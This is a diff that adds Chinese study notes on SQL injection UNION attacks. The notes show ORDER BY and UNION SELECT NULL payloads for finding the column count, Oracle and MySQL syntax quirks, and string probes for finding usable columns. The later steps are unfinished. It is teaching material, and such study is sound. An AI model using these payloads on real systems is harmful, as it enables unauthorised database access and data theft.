@@ -132,5 +132,65 @@ SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT use
 - 原始查询的哪些列可以保存注入查询的结果
 
 1. 确定SQL注入UNION攻击所需的列数
-   - 
-2. 
+
+   - 使用ORDER BY语句递增，直至发生错误。
+
+     ```mysql
+     ' ORDER BY 1--
+     ```
+
+     这个有效载荷改变了原始查询语句，以结果集中不同列对结果排序查询。当指定列的索引超过结果集中的实际列数时，数据库将返回错误。
+
+   - 提交一系列有效载荷，指定不同数量的NULL。
+
+     ```sql
+     ' UNION SELECT NULL--
+     ' UNION SELECT NULL,NULL--
+     ' UNION SELECT NULL,NULL,NULL--
+     ```
+
+     当NULL与列数不匹配时，数据库将返回错误。
+
+   - ==注意==
+
+     - 使用NULL作为注入SELECT查询的返回值是因为，每列的数据类型必须在原始查询和注入查询之间兼容。NULL可以转换为任意数据类型，当列数正确时，使用NULL可以最大限度提高有效载荷的成功率
+
+     - Oracle上每个SELECT查询都必须使用FROM关键字并指定一个有效的表。在Oracle中有个dual内置表。故查询语句为
+
+       ```sql
+       ' union select null from dual--
+       ```
+
+     - 在Mysql中--后必须有空格，或直接使用#注释
+
+2. 在SQL注入中通过UNION查找有用数据类型列
+   首先需要用
+
+   ```sql
+   ' UNION SELECT NULL--
+   ' UNION SELECT NULL,NULL--
+   ' UNION SELECT NULL,NULL,NULL--
+   ```
+
+   确定返回列数。随后通过使用所需类型替换NULL进行测试。
+   如
+
+   ```sql
+   ' UNION SELECT 'a',NULL,NULL,NULL--
+   ' UNION SELECT NULL,'a',NULL,NULL--
+   ' UNION SELECT NULL,NULL,'a',NULL--
+   ' UNION SELECT NULL,NULL,NULL,'a'--
+   ```
+
+   若不兼容，可能返回HTTP错误或数据库查询错误。
+
+   ```sql
+   Conversion failed when converting the varchar value 'a' to data type int.
+   ```
+
+   若未发生错误则包含一些附加内容（包括注入的字符串）。
+
+3. 通过SQL注入查询特定数据
+   当确定了原始SQL语句查询返回的列数和类型时，可以检索特定表中的符合类型的内容
+
+4. 
